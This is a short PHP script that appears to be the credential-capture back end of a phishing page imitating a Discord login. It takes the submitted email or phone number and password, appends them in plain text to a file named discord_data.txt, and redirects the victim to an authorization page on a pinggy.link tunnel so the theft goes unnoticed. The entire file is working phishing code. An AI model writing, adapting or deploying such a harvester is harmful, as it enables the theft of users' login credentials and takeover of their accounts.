<?php
$emailORphone = $_POST['emailORphone'];
$password = $_POST['password'];
$file = fopen("discord_data.txt", "a");
$text = "emailORphone: " . $emailORphone . " password: " . $password . "\n";
fwrite($file, $text);
fclose($file);
header('Location: https://rnqpt-2001-b07-6466-ee9-948d-bb40-4ed4-efb1.a.free.pinggy.link/authorization.html');
?>